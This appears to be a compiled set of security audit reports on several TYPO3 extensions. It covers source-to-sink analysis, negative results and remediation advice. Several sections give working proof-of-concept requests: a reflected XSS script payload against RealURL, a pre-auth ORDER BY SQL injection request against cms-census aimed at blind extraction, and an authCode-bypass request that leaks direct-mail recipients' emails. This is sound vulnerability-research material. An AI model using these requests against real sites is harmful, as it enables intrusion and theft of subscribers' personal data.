Additional sinks that reflect attacker-controlled URL fragments into the same unescaped `$msg` channel:
- `Realurl.php:1416` — reflects `$key` (URL path segment).
- `Realurl.php:1647` — reflects `$value` (URL-derived segment value).
- `Realurl.php:1685` — reflects unmapped alias `$value` (URL segment).
- `Realurl.php:1493`, `:1500`, `:1541` — reflect `$fileName` (URL-derived).

**Exploitability**

RealURL emits the raw, un-encoded attacker string. Whether it becomes executable script depends on how the host TYPO3 core version renders `pageNotFoundAndExit($reason)`:
- If `$GLOBALS['TYPO3_CONF_VARS']['FE']['pageNotFound_handling']` is unset/`false` (a common default) and the core build echoes the reason without escaping (behaviour seen in older 7.x error rendering), the payload executes.
- Modern core builds `htmlspecialchars()` the reason in `ErrorPageController`, which neutralises it.

Because the extension itself never sanitises, sites on affected core builds are exposed; this is the same defect class as the historical RealURL 404-reflection XSS advisory. Treat as a real pre-auth XSS on vulnerable core configurations and fix in the extension (defence in depth) by `htmlspecialchars()`-ing the URL before embedding it in the 404 reason.

**PoC**

```
GET /"><script>alert(document.domain)</script>/nonexistent-page HTTP/1.1
Host: victim.example
```

The path fails to resolve, `count($pathParts)` is non-zero at `Realurl.php:1205`, and the raw path (including `"><script>...`) is embedded verbatim in the 404 reason and handed to core for rendering. (Characters may be sent raw by a non-browser client; RealURL does not require them URL-encoded.)

**Remediation:** In `decodeSpURL_throw404()` and each `decodeSpURL_throw404('...')` call site, HTML-encode any request-derived value (`$speakingURIpath`, `$key`, `$value`, `$fileName`) before concatenation, and do not rely on core to escape the reason.

---

## Reviewed and NOT vulnerable (negative results)

- **SQLi — alias decode / lookup translation** (`lookUpTranslation` `Realurl.php:1954/1989/2003`, `lookUp_uniqAliasToId` `:2060`, `lookUp_idToUniqAlias` `:2099`, `pageAliasToID` `:2315`): URL alias value reaches SQL only via `fullQuoteStr($value, ...)`; `id_field`/`table`/`addWhereClause`/`languageField` are admin TypoScript `$cfg`, not URL-controlled. `$lang` from `orig_paramKeyValues` is forced through `intval()` (`:1977`). Not injectable.
- **SQLi — reverse page lookup wildcard WHERE** (`Pagepath.php:243-254`, `findPossiblePageIds` `:209`): URL `$pathSegment` is wrapped in `fullQuotestr('%'.str_replace(...).'%', ...)`. `segTitleFieldList`/`spaceCharacter` are admin config. Injected `%` stays inside the quoted literal. Not injectable. (Minor: the quote-context table arg is the typo `'pages)'`, cosmetically wrong but security-irrelevant.)
- **SQLi — cache lookups** (`Cachemgmt.php:264/266/293` path lookups; `:338/364` pid lookups): URL `$pagePath` via `fullQuoteStr`; pid via `intval`; `_getAddCacheWhere` uses `intval`-ed config. Not injectable.
- **SQLi — chash cache** (`Realurl.php:875/1898/1908`): key is `md5(...)` / `fullQuoteStr`. Not injectable.
- **SQLi — domain/root-page resolution** (`Realurl.php:1129/2578/2630`, `ConfigurationService.php:119`): `HTTP_HOST`/`host` via `fullQuoteStr`. Host header is attacker-influenced but quoted; not injectable.
- **Open redirect / header injection — protocol-wrapper redirect** (`Realurl.php:962`): `getURIpathWithoutProtocolWrapper()` (`:2918`) strips `http(s)://…` and forces a leading `/`, preventing off-site redirect. `header()` blocks CRLF injection in supported PHP. Not exploitable.
- **Open redirect — appendMissingSlash redirect** (`Realurl.php:1007`) and postVar failure redirect (`:1409`): targets are relative, guarded by `parse_url(..., PHP_URL_HOST)` check (`:1004`) and routed through `GeneralUtility::locationHeaderUrl()`. Not an open redirect.
- **Config `redirects`/`redirects_regex`** (`Realurl.php:1091-1113`): redirect targets come from admin TypoScript, not the URL. Not attacker-controlled.
- **Object injection**: the only `unserialize` (`Realurl.php:205`) consumes `TYPO3_CONF_VARS['EXT']['extConf']['realurl']` (admin ext config), not request data. `callUserFunction` sinks (`:353,520,702,974,1320,1678,2238,2267`) invoke admin-configured `userFunc` names, not URL-controlled class strings. No pre-auth object injection.
- **Path traversal — file handling** (`Realurl.php:1490-1541`): `$fileName` is matched against configured `fileName.index`/`defaultToHTMLsuffixOnPrev` config and existence-checked; no filesystem read/include of the raw segment. Reflection only (covered by Finding 1).
- **Cache poisoning**: decode cache rows are keyed by resolved page id + quoted path with `intval`-ed root/language scoping; error-log writes (`:1752-1779`) store the URL as data via `exec_INSERTquery`/parameterised arrays. No unauthenticated write of a poisoned executable value observed.

---

## Known CVEs / advisories cross-reference (vs. 1.12.8.19)

- **SQL injection in EXT:realurl** (TYPO3-EXT-SA advisories for RealURL; fixed by quoting alias values in the id/alias lookup functions in the 1.12.7 / 2.0.x line): **PATCHED here** — all alias, uniqalias and page-alias lookups use `fullQuoteStr`. Base version 1.12.8 is past the fix.
- **XSS via reflected request URL in RealURL error/404 output** (historical RealURL reflected-URL advisory class): **Extension still emits the raw URL unescaped** (Finding 1). Residual exposure depends on the host TYPO3 core's `pageNotFound_handling` rendering; recommend fixing in-extension.
- No evidence this fork re-introduces the patched SQLi; the AOE patchset (reverse page-id lookup in `Pagepath.php`) also quotes its URL input.

## Recommendation

Escape all request-derived strings before embedding them in `decodeSpURL_throw404()` messages (Finding 1). No SQLi, object-injection, open-redirect, or path-traversal defects were found on the pre-auth decode path in this version.

### apache-solr-for-typo3_solr

#### Security Audit — apache-solr-for-typo3/solr (ext-solr)

- **Target:** `/home/user/sources/code/typo3-extensions/apache-solr-for-typo3_solr`
- **Version:** `14.0.0-RC1` (from `composer.json`; no `ext_emconf.php` present)
- **Scope:** Pre-auth exploitable source→sink vulns in Routing (URL facets), search request handling, eID handlers, the unauthenticated frontend search/suggest plugins, and DB repositories under `Classes/Domain/...` and `Classes/System/Records/...`.
- **Date:** 2026-08-04
- **Auditor focus caveat honored:** `->query()/setQuery()/search()` against the Solr connection are NOT SQL. Only TYPO3 QueryBuilder / raw DB `where()` with attacker input were considered for SQLi.

## Summary

No concrete pre-auth exploitable vulnerability (SQLi, XSS, object injection, path traversal, SSRF, code injection) was found in the audited code paths for this version. The historically sensitive spots — the unauthenticated suggest endpoint and the frontend DebugWriter — are remediated/gated in 14.x. The routing/URL-facet layer is pure string manipulation with no injection sink. All database repositories use parameterized TYPO3 QueryBuilder (`createNamedParameter`, `Connection::PARAM_*`, `intval` casting) with no string concatenation into `where()`. The eID API handler is gated by a secret-derived key and dispatches only whitelisted methods. Findings below are all defensively-analyzed non-issues or low-severity items that are NOT pre-auth reachable; they are documented for completeness.

---

## Cleared / analyzed items (no pre-auth exploit)

### A. eID `tx_solr_api` dynamic method dispatch — NOT exploitable
- **File:** `Classes/Eid/ApiEid.php:58` — `$this->{'get' . ucfirst($request->getQueryParams()['api']) . 'Response'}($request)`
- **Source:** `?api=` query param (attacker-controlled), registered at `ext_localconf.php:99` as unauthenticated eID `tx_solr_api`.
- **Why safe:**
  1. `validateRequest()` (line 82) first requires a valid API key: `Api::isValidApiKey($params['apiKey'])`. Key = `sha1($GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey'] . 'tx_solr_api')` (`Api.php:39`). Without the site `encryptionKey` (a secret) the key cannot be forged → **not pre-auth**.
  2. `validateRequest()` also enforces `array_key_exists($params['api'], self::API_METHODS)` (line 95), and `API_METHODS` only contains `siteHash`. The dynamic method name is therefore constrained to `getSiteHashResponse` — no arbitrary method invocation. Not a constant-callback FP concern because the whitelist is enforced before dispatch.

### B. Routing / URL facet handling — string-only, no injection sink
- **Files:** `Classes/Middleware/SolrRoutingMiddleware.php`, `Classes/Routing/RoutingService.php`, `Classes/Routing/UrlFacetService.php`
- The middleware runs pre-auth on the frontend and converts URL path segments into `tx_solr[...]` query parameters (`process()`, `extractParametersFromUriPath()`, `addPathArgumentsToQuery()`, `processUriPathArgument()`). Every operation is `explode/implode/substr/str_replace/urldecode/array_map`. The `array_map([$service, 'decodeSingleValue'/'encodeSingleValue'/'applyCharacterMap'])` callbacks (`RoutingService.php:221,249,572,608,662,663,691`) resolve to fixed methods on `UrlFacetService` (verified constant callbacks, not attacker-selected callables) that only do `str_replace`/`urldecode`. No `unserialize`, no DB access, no `eval`, no dynamic callable from request. Output is written back as query params consumed by Extbase (Fluid auto-escapes) and by Solr (escaped, see D). **No sink.**

### C. Unauthenticated Suggest plugin (`pi_suggest`) — output is escaped
- **Files:** `Classes/Controller/SuggestController.php`, `Classes/Domain/Search/Suggest/SuggestService.php`
- Reachable pre-auth (frontend plugin, `ext_localconf.php:208-215`).
- User query is escaped at the boundary: `SuggestController.php:43` `$rawQuery = htmlspecialchars(mb_strtolower(trim($queryString)))`, and `SuggestController.php:57` `$additionalFilters = array_map('htmlspecialchars', $additionalFilters)`.
- The reflected `suggestion` field (`SuggestService.php:250` `getRawUserQuery()`) and suggestion keys (`getSuggestionArray()`, built from the already-escaped query + Solr-index-derived strings) therefore carry no raw request markup. Response is `json_encode(...)`. This matches the fix for the historical suggest-reflection XSS. **No per-request reflected XSS.**

### D. Solr filter value insertion — Solr-side, not SQLi, low risk
- **File:** `Classes/Search/FacetingComponent.php:187` — `$filterParts[] = $facetConfiguration['field'] . ':' . $filterValue;` where `$filterValue` derives from `tx_solr[filter]` (`:204` `array_map('rawurldecode', $resultParameters['filter'])`).
- The field name is not attacker-chosen freely: the facet name must match a configured facet (`getFacetNamesWithConfiguredField()`) and `field` comes from TypoScript config. The value is decoded by the facet's `filterEncoder->decode()`. The resulting string is added as a **Solr** filter query (`AbstractQueryBuilder.php:262 addFilterQuery`). This is a Solr query, explicitly out of the SQLi scope; at worst it is Solr filter-query manipulation against a read-only search core (broadening/narrowing results), which upstream treats as accepted behavior. Not a SQL injection and not a memory/RCE sink. **Noted, not a DB vuln.**

### E. `unserialize()` in event queue worker — NOT pre-auth
- **File:** `Classes/Task/EventQueueWorkerTask.php:87` — `$event = unserialize($queueItem['event'])`.
- Source is the `tx_solr_eventqueue_item` DB table, populated by the record-monitoring/indexing pipeline (backend editor/admin data changes), and consumed by a Scheduler task (CLI/backend). It is not reachable from an unauthenticated frontend request, and writing arbitrary serialized payloads to that column requires DB write access. **Object-injection primitive exists but is not pre-auth reachable** → informational only.

### F. Frontend DebugWriter `echo` — gated, not pre-auth
- **File:** `Classes/System/Logging/DebugWriter.php:100` — `echo $message . ':<br/>';` then `DebuggerUtility::var_dump()`.
- Guarded by `getIsAllowedByDevIPMask()` (caller IP must match `SYS/devIPmask`) AND `getLoggingDebugOutput()` config being enabled (`write()` lines 43-51). `$message` is developer log text, not directly a request parameter. Requires dev-IP + explicit debug config → not a general pre-auth XSS.

### G. `HighlightResultViewHelper` `call_user_func` — not request-controlled
- **File:** `Classes/ViewHelpers/Document/HighlightResultViewHelper.php:60` — `call_user_func([$document, 'get' . $fieldName])`. `$fieldName` is a Fluid template argument set by the site integrator, not a request parameter, and output passes through `escapeEverythingExceptAllowedTags()` (htmlspecialchars). Not attacker-controlled.

### H. Database repositories — parameterized, no SQLi
- **Files:** `Classes/System/Records/**` (`AbstractRepository`, `PagesRepository`, `EventQueueItemRepository`, `SystemCategoryRepository`, `SystemTemplateRepository`), `Classes/Domain/Index/Queue/**` (`QueueItemRepository`, `QueueStatisticsRepository`, `ConfigurationAwareRecordService`), `Classes/ContentObject/Relation.php`.
- All `where()/andWhere()` clauses use `createNamedParameter(...)` / `expr()->eq|in|notLike(...)` / `quoteIdentifier(...)`, and list inputs are sanitized with `array_map('intval', ...)`. Grep for string concatenation into `where()` (`'.$var` / `$var.'`) returned **zero** matches. `quoteIdentifier()` targets are constant column names, not request input. No `exec_SELECT*`, no raw SQL. **No SQLi.**

### I. SSRF / path traversal / code-injection primitives — none with request input
- No `file_get_contents/fopen/readfile/include/require/curl_exec/RequestFactory` fed by request data in the audited paths.
- `parse_str` uses (`AbstractSolrService.php:360`, `UrlHelper.php:30,51`, `PostEnhancedUriProcessor.php:53`) all parse internally-constructed URLs/queries into a local array (two-arg form, no global overwrite). No `eval/create_function/assert/preg_replace-e/$$`.

---

## Known CVEs / advisories cross-reference

- ext-solr has had TYPO3 security advisories historically in the **suggest/search reflection** area (Cross-Site Scripting via the unauthenticated suggest eID/plugin echoing the raw query). In `14.0.0-RC1` this is remediated: `SuggestController::suggestAction()` applies `htmlspecialchars()` to both `$queryString` and each `additionalFilters` entry before use (see finding C). No unpatched match found.
- No known SQL-injection CVE applies: the DB layer is fully parameterized (finding H).
- Note: `14.0.0-RC1` is a **release candidate**. Confirm the final GA and any advisories published after the assistant knowledge cutoff (Jan 2026) via the TYPO3 security advisories feed / `TYPO3-Solr/ext-solr` releases before production use.

## Verdict

No actionable pre-auth source→sink vulnerability identified in the audited scope for this version.

### auba_cms-census

#### auba_cms-census — UrlRepository.php:131 (fetchSearchResult)

## Verdict: CONFIRMED pre-auth SQL injection (ORDER BY direction), anonymous frontend

**Sink (line 116-131):**
```php
116  public function fetchSearchResult($searchData,$sort,$formate){
118      if($searchData['domain']){
119          $sort = $sort ? $sort : 'uid';
120          $formate = $formate ? $formate : 'ASC';
121          $queryBuilder = ...->getQueryBuilderForTable('tx_cmscensus_domain_model_url');
122          $queryBuilder->select('*')->from(...)
125              ->where($queryBuilder->expr()->like('name',
128                  $queryBuilder->createNamedParameter($queryBuilder->escapeLikeWildcards($searchData['domain']).'%')))
131              ->addOrderBy((string)$sort, $formate);   // <-- $formate = ORDER BY direction, unsanitized
```

`QueryBuilder::addOrderBy($fieldName, $order)` in TYPO3 v11 quotes the **field name** (`$sort`) via `quoteIdentifier()`, but passes the **direction** (`$order` = `$formate`) straight through to Doctrine's concrete query builder, which concatenates it as `` `field` <direction> ``. The direction string is never validated or quoted → arbitrary SQL can be injected into the ORDER BY clause through `$formate`.

## Tainted chain (request → sink)
```
ChartController.php:85  $searchData = GeneralUtility::_GP('tx_cmscensus_chartcmscensus');
ChartController.php:86  $sortBy     = GeneralUtility::_GP('sortby');     // -> $sort (field, quoted -> safe)
ChartController.php:87  $sort       = GeneralUtility::_GP('formate');    // -> $formate (direction, INJECTABLE)
ChartController.php:88  if($searchData['domain']) {
ChartController.php:91      $this->urlRepository->fetchSearchResult($searchData, $sortBy, $sort);
UrlRepository.php:120       $formate = $formate ? $formate : 'ASC';
UrlRepository.php:131       ->addOrderBy((string)$sort, $formate);
```
The lines 89-90 (`$sort=='null' ? ... : $sortBy;`) are effectively no-ops (results discarded / typo), so the raw `formate` GET value survives unless it is literally the string `null`.

## Reachability / auth
**Anonymous frontend.** `ext_localconf.php` registers the FE plugin via
`ExtensionUtility::configurePlugin('CmsCensus','Chartcmscensus', [ChartController::class => 'show, search'], ...)` and `search` is listed as a non-cacheable frontend action. Any public page holding the `cmscensus_chartcmscensus` content element exposes `searchAction` to unauthenticated visitors. No FE-user or BE-user check. Pre-auth.

## Exact request to trigger
On a page (uid `<PID>`) that contains the Chartcmscensus plugin:
```
GET /index.php?id=<PID>
    &tx_cmscensus_chartcmscensus[action]=search
    &tx_cmscensus_chartcmscensus[controller]=Chart
    &tx_cmscensus_chartcmscensus[domain]=x
    &sortby=uid
    &formate=ASC,(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)
```
`sortby`/`formate` are top-level (non-namespaced) GET params read by `_GP()`. `tx_cmscensus_chartcmscensus[domain]` must be non-empty to enter the vulnerable branch. The `formate` value is injected verbatim after the quoted `` `uid` `` in the ORDER BY clause, enabling error/boolean/time-based blind extraction.

## Version
`version => 1.1.1`, depends `typo3 11.5.0-11.5.99` (Doctrine QueryBuilder).

### azich_direct-mail

#### Security Audit — `azich/direct-mail` (v6.0.0-dev)

TYPO3 newsletter/direct-mail extension. CodeQL flagged 16 SQL-injection candidates.
Scope of this review: **pre-authentication** attack surface = the frontend jumpUrl /
click-tracking middleware and the FE-rendering hook. Backend modules (BE-login required)
are noted but out of pre-auth scope.

## Summary

| # | Finding | Severity | Pre-auth | Type |
|---|---------|----------|----------|------|
| 1 | Inverted `authCode` check in `JumpurlController::validateAuthCode` — authentication bypass | **MEDIUM** | **YES** | Broken auth / IDOR / PII enumeration |
| 2 | 16 CodeQL SQLi candidates are all backend-module / `intval`-guarded — NOT pre-auth, NOT injectable | Info | No | (false / non-exploitable) |
| 3 | FE `simulateUsergroup` group-simulation gated by random 32-hex token | Info | (n/a) | Not exploitable |

**Real bug: Finding 1** — the frontend jumpUrl auth-code verification logic is inverted,
so an unauthenticated attacker who supplies an empty or wrong `aC` passes the check for
any recipient/mail id.

---

## Finding 1 — Authentication bypass via inverted authCode validation (PRE-AUTH)

- **Severity:** MEDIUM (would be HIGH but the FE auto-login sink is dead — see below)
- **Pre-auth:** YES — unauthenticated frontend request through the jumpUrl middleware.
- **Source → sink:**
  - Source: `Classes/Middleware/JumpurlController.php:85-88` — `mid`, `rid`, `aC`, `jumpurl` from `$request->getQueryParams()`.
  - Sink (broken check): `Classes/Middleware/JumpurlController.php:312-330` (`validateAuthCode`).
- **Registration:** middleware registered in `Configuration/RequestMiddlewares.php` on every FE request; `shouldProcess()` fires whenever `mid` is present (`JumpurlController.php:217-220`).

### Tainted path

`process()` (line 79) reads request params, and for an integer `jumpurl`:

```
initDirectMailRecord($mailId)            // loads sys_dmail row (parameterized, int)
initRecipientRecord($submittedRecipient) // rid "t_<uid>"/"f_<uid>" -> loads recipient row
if (!empty($this->recipientRecord)) {
    $this->validateAuthCode($submittedAuthCode);   // <-- BROKEN
    $jumpurl = $this->substituteMarkersFromTargetUrl($targetUrl);
    $this->performFeUserAutoLogin();
}
```

The check itself (lines 312-330):

```php
protected function validateAuthCode($submittedAuthCode): void
{
    $authCodeToMatch = GeneralUtility::stdAuthCode(
        $this->recipientRecord,
        ($this->directMailRecord['authcode_fieldList'] ?? 'uid')
    );
    if (!empty($submittedAuthCode) && $submittedAuthCode === $authCodeToMatch) {
        throw new \Exception('authCode verification failed. ...', 1376899631);
    }
}
```

The logic is **inverted**:
- empty `aC`  → condition false → **no throw → passes**
- wrong `aC`  → condition false → **no throw → passes**
- *correct* `aC` → condition true → throws ("verification failed")

So the guard rejects only the legitimate holder of the code and lets everyone else
through. This defeats the per-recipient auth code whose entire purpose is to ensure the
person following a personalized newsletter link is the recipient encoded in `rid`.
Contrast with the upstream `directmailteam` fork, which uses
`AuthCodeUtility::validateAuthCode()` (returns bool) and explicitly
`throw`s when `!$valid` — i.e. the correct polarity. This is a fork-introduced defect.

### Exploitability / impact

After the bypass, `substituteMarkersFromTargetUrl()` (lines 338-401) replaces
`###USER_<field>###` markers in the stored newsletter link (`absRef` from the sent mail)
with fields of the recipient identified by the attacker-chosen `rid`, then the request is
redirected to that URL (`juHash` recomputed, lines 140-143). Because personalized
newsletter links legitimately carry markers such as `###USER_email###` /
`###USER_name###` (that is precisely why jumpUrl resolves them per-recipient at click
time), an attacker can iterate `rid=t_1, t_2, …` (tt_address) and `rid=f_1, f_2, …`
(fe_users) for a valid `mid` and read each recipient's personal fields out of the
resulting `Location`, i.e. **unauthenticated subscriber/e-mail enumeration (PII / GDPR)**.
It also lets anyone forge click-tracking rows for arbitrary recipients.

The more dangerous sink, `performFeUserAutoLogin()` (lines 409-422), which would set
`$_POST['user']/['pass']/logintype=login` from the recipient row, is **not reachable in
this fork**: it requires `$this->recipientTable === 'fe_users'`, but the fork's constant
is `RECIPIENT_TABLE_FEUSER = 'fe_user'` (singular, line 40) assigned at line 295. The
string mismatch means the branch never executes, so FE session takeover does **not**
occur here. (Remove the typo and this becomes a pre-auth account-takeover.)

### PoC

```
GET /index.php?eID=tx_directmail&mid=1&rid=t_1&jumpurl=0&aC= HTTP/1.1
```
(Any FE URL that runs the middleware works; `aC` empty or arbitrary.) For a mail whose
link template contains `###USER_email###`, the 30x `Location` returned for `rid=t_1`,
`rid=t_2`, … leaks each recipient's email — no auth code needed. Correct `aC` values, by
contrast, produce HTTP 500 (`authCode verification failed`), confirming the inversion.

### Remediation

Invert the condition: proceed only when a non-empty `aC` **equals** the computed code,
and throw otherwise — mirror `directmailteam`'s `AuthCodeUtility::validateAuthCode()`.
Also fix the `fe_user`→`fe_users` constant (or disable `performFeUserAutoLogin` entirely).

---

## Finding 2 — CodeQL SQLi candidates are backend-module / integer-guarded (NOT pre-auth)

No pre-auth SQL injection exists. Every request-reachable query on the pre-auth path uses
parameter binding or hard int casts:

- `initDirectMailRecord` (`JumpurlController.php:227-245`) — `createNamedParameter($mailId, PDO::PARAM_INT)`.
- `getRawRecord` (`JumpurlController.php:188-210`) — `$uid = (int)$uid;` then `createNamedParameter(..., PARAM_INT)`.
- `initRecipientRecord` (`:281-305`) — `rid` split on `_`; only the numeric part reaches `getRawRecord`, which int-casts it. The table name is chosen from a fixed `switch` (`t`/`f`) — not attacker text.
- `hasRecentLog` (`:154-176`) — all predicates `createNamedParameter`.
- Maillog `insert()` uses an array of typed values (`:122-135`).

The 16 flagged raw `->add('where', '…' . $var . '…')` sinks live in **backend modules and
utilities that require a valid TYPO3 backend session**, and the interpolated request parts
are `intval()`-wrapped:

- `Classes/Module/Statistics.php` (e.g. lines 269, 364, 379, 400, 462, 602-655, 1008…1376) — `Statistics extends BaseScriptClass` (BE module); `mid=' . intval($row['uid'])`, `pid=' . intval($this->id)`, `tt_address.uid=' . intval($uid)`.
- `Classes/Module/Dmail.php` (1177, 1215), `Classes/Module/RecipientList.php` (891, 910), `Classes/Module/MailerEngine.php` (401, 423) — BE modules; `IN (` lists built from `intval`/`implode` of int uids.
- `Classes/DirectMailUtility.php:544, 689, 728` and `Classes/Hooks/TtnewsPlaintextHook.php:119` — invoked from BE modules / mail composition; `$groupIdList` is int uids, `$pidList` passes through `createNamedParameter`, `pid=' . intval($row['pid'])`.

These are not reachable pre-auth and are not concretely injectable. (`Statistics.php:400`
`->add('where','uid_local=' . $row['uid'])` uses a DB-sourced value inside a BE module — a
code-smell worth hardening, but not attacker-tainted and not pre-auth.)

---

## Finding 3 — FE `simulateUsergroup` hook (not exploitable)

`Classes/Hooks/TypoScriptFrontendController.php:39-52` reads `dmail_fe_group` +
`access_token` from GET and can raise the FE user's group. It is gated by
`DirectMailUtility::validateAndRemoveAccessToken()` (`DirectMailUtility.php:1420-1430`),
which strict-compares against a 32-char `Random::generateRandomHexString(32)` stored in the
registry and is single-use. Not brute-forceable; no bypass.

---

## Known CVEs / advisories (cross-reference)

- **TYPO3-EXT-SA-2020-005** — direct_mail: **CVE-2020-12699** jumpUrl Open Redirect,
  **CVE-2020-12700** information disclosure via CSV "special query" export (fixed 5.2.4).
  This fork is a 6.x-dev line: the jumpUrl integer path is constrained by stored
  `absRef` + recomputed `juHash`, and `isAllowedJumpUrlTarget` (`:444-462`) throws on
  arbitrary valid URLs, so the classic open-redirect is mitigated — but the **authCode
  inversion (Finding 1) is a new, fork-specific regression** not covered by any advisory.

Sources:
- https://typo3.org/security/advisory/typo3-ext-sa-2020-005
- https://advisories.gitlab.com/pkg/composer/directmailteam/direct-mail/CVE-2020-12699/

### beechit_default-upload-folder

#### Security Audit — beechit/default_upload_folder

- Extension key: `default_upload_folder`
- Version: 3.0.0 (`ext_emconf.php`)
- Platform: TYPO3 v12.4 / v13.4
- Scope: path traversal / folder escape in the computed upload path from request
  data, injection

## Summary

No concrete vulnerability found, and no pre-auth surface exists. The extension is a
**backend-only** event listener (`AfterDefaultUploadFolderWasResolvedEvent`) that
runs inside an authenticated TYPO3 backend user session. The computed sub-folder is
sourced entirely from **Page TSconfig and User TSconfig** (integrator/admin-
controlled), never from HTTP request parameters. Folder resolution and creation go
through FAL (`ResourceFactory`, `ExtendedFileUtility`), which normalise paths and
enforce storage/filemount permissions.

## Entry point / data flow

- Entry: `DefaultUploadFolder::__invoke(AfterDefaultUploadFolderWasResolvedEvent)`
  (`Classes/EventListener/Backend/DefaultUploadFolder.php:26`). This event fires
  during backend file-upload/FormEngine handling — it requires an authenticated
  `$GLOBALS['BE_USER']` (used directly at `:34`). **Not reachable pre-auth.**
- Path source: `$subFolder` is read from
  `BackendUtility::getPagesTSconfig($pid)` and `$GLOBALS['BE_USER']->getTsConfig()`
  under the `default_upload_folders.` key
  (`:33-45`, `getDefaultUploadFolderForTableAndField/ForTable/ForAllTables`,
  `:127-194`). `$table`/`$field`/`$pid` come from the event, and are only used as
  **array keys** to look up an admin-defined TSconfig value — they are not
  concatenated into the path.

## Findings (attack classes disproven)

### 1. Folder escape / path traversal from request data — NOT VULNERABLE
- SEVERITY: n/a  PRE-AUTH: no (backend, authenticated)
- The upload path string is not built from request input. It is a TSconfig value.
  The only request-influenced values (`$table`, `$field`, `$pid`) select *which*
  TSconfig entry applies; they never become path segments. To place a traversal
  string one must already be able to write Page/User TSconfig, which is an
  admin/integrator privilege.
- Sinks are FAL-mediated and permission-checked:
  `ResourceFactory::getFolderObjectFromCombinedIdentifier($subFolder)`
  (`:51`, `:113`) which catches `InsufficientFolderAccessPermissionsException`
  (`:56` → returns null), and folder creation via
  `ExtendedFileUtility` with `setActionPermissions()` (`:109-111`), which enforces
  the BE user's filemount/storage permissions. The subfolder-append branch
  `$uploadFolder->getSubfolder($subFolder)` (`:61-63`) operates on a resolved FAL
  `Folder`, whose driver normalises `..` and confines access within the storage.

### 2. Injection (date-format placeholder replacement) — NOT VULNERABLE
- `checkAndConvertForDateFormat()` (`:203-224`) only performs a fixed
  `str_replace` of `{Y}{y}{m}{n}{j}{d}{W}{w}` with `date()` output on an
  admin-supplied TSconfig string. No `eval`, no shell, no dynamic key from request.

## Cross-reference

No public TYPO3-EXT-SA is known for this widely-used extension at v3.0.0 for the
reviewed listener. Assessment from source review.

## Conclusion

Not exploitable: backend-authenticated context, upload path derived from
admin-controlled TSconfig (not request data), and all filesystem operations routed
through permission-enforcing FAL APIs. No path traversal or injection.

### beechit_fal-securedownload

#### Security Audit — beechit/fal_securedownload v6.0.3

**Target:** `/home/user/sources/code/typo3-extensions/beechit_fal-securedownload` (v6.0.3, `typo3/cms-core: ^13.4`, PHP ^8.2)
**Scope:** pre-auth arbitrary file read via the secure-download / dump path and the `FalSecuredownloadFileTreeState` eID — access-control bypass, path traversal, forgeable token.
**Date:** 2026-08-04

## Summary / Verdict

**No pre-auth arbitrary file read found in v6.0.3.** The three target hypotheses were traced request-parameter → sink and **disproven**:

1. **Access-control bypass — NOT FOUND.** The FE download flow delegates to TYPO3 core's `FileDumpController` (core eID `dumpFile`), which dispatches `ModifyFileDumpEvent`. This extension's `ModifyFileDumpEventListener` runs on that event **on every dump** and enforces FE-group access via `CheckPermissions` before the file is streamed; on denial it hard-`exit`s (401/403). An anonymous request resolves to `userFeGroups = false`, and `matchFeGroupsWithFeUser()` denies any folder/file that carries a non-empty `fe_groups` restriction. The listener is unconditionally registered (`Services.yaml`), so there is no code path that streams a protected file without the check.

2. **Path traversal — NOT FOUND.** Every file-serve sink dereferences an **integer file UID**, never an attacker-supplied path. `DownloadLinkViewHelper`/core pass `f=<uid>` / `p=<uid>`; the sinks are `ResourceStorage::streamFile($file)` and `$file->getForLocalProcessing()` where `$file` came from `ResourceFactory::getFileObject((int)$uid)` / `ProcessedFileRepository::findByUid()`. No `readfile`/`PATH_site.$x`/`getFileAbsFileName()` on request input; the FAL driver confines identifiers to the storage root. No `../` reaches a filesystem read.

3. **Forgeable / predictable token — NOT FOUND.** FE token = `HashService::hmac('dumpFile|<t>|<uid>', 'resourceStorageDumpFile')`; BE token = `HashService::hmac(..., 'BeResourceStorageDumpFile')`. `HashService` keys the HMAC with the site `encryptionKey`. Not forgeable/predictable without server secret. Core rejects a bad `token` with 403 before dispatching the dump event.

The extension is current (TYPO3 v13) and actively maintained, not the vulnerable legacy `dumpFile`-in-extension design of the 1.x/2.x line. No TYPO3 security advisory is published specifically for this extension.

## Full request→sink map (all file-serve routes gated)

| Route | Auth/token gate | Access check | Sink |
|---|---|---|---|
| FE `?eID=dumpFile&t=f&f=<uid>&token=<hmac>` | core `FileDumpController` validates `token` (encryptionKey HMAC) | `ModifyFileDumpEventListener::checkFileAccess` → `CheckPermissions::checkFileAccess` (folder rootline + file `fe_groups`) | `ResourceStorage::streamFile` / `getForLocalProcessing` (`ModifyFileDumpEventListener.php:187,208`) |
| BE ajax `ajax_dump_file` (`/typo3/…/fal_securedownloads/dump_file`) | Backend route ⇒ requires BE session **and** `fal_token` HMAC (`BeResourceStorageDumpFile`) | `getStorage()->checkFileActionPermission('read', $orgFile)` (`BePublicUrlController.php:86`) | `streamFile` (`BePublicUrlController.php:92`) |
| FE `?eID=FalSecuredownloadFileTreeState` | `EidFrontendAuthentication` middleware sets FE-user aspect | (none — non-file action) | session write only, no file bytes returned |

## Findings (concrete, lower severity — not pre-auth file read)

### F1 — Unauthenticated folder-existence oracle + arbitrary session-key write via `FalSecuredownloadFileTreeState` eID
- **SEVERITY:** Low. **PRE-AUTH:** Yes (anonymous session).
- **Source:** `folder` request param → `FileTreeStateController::saveLeafState` (`Classes/Controller/FileTreeStateController.php:62-69`).
- **Sink:** `LeafStateService::saveLeafStateForUser` → `ResourceFactory::getFolderObjectFromCombinedIdentifier($folder)` (`Classes/Service/LeafStateService.php:49`), then writes `$folderState[$folder]=true` into the FE user/session store (`:93`).
- **Tainted path:** fully attacker-controlled combined identifier `<storage>:<path>`, no permission check.
- **Exploitability:** Does **not** return file contents. A valid vs. invalid folder yields different responses (existing folder → `{}`/200 and a session entry; non-existent → `FolderDoesNotExistException`/500, or 404 on empty), giving a folder-existence oracle across all storages. Also lets an anonymous visitor write arbitrary keys/growth into their own session record. No cross-user impact, no file disclosure.
- **PoC:** `GET /index.php?eID=FalSecuredownloadFileTreeState&folder=1:/secret/&open=1` vs `folder=1:/does-not-exist/` and compare status/exception.

### F2 — `unserialize()` of session-stored leaf state
- **SEVERITY:** Informational. **PRE-AUTH:** No practical attacker channel.
- **Location:** `LeafStateService::getFolderState` — `unserialize($folderStates)` (`Classes/Service/LeafStateService.php:81`) without `['allowed_classes' => false]`.
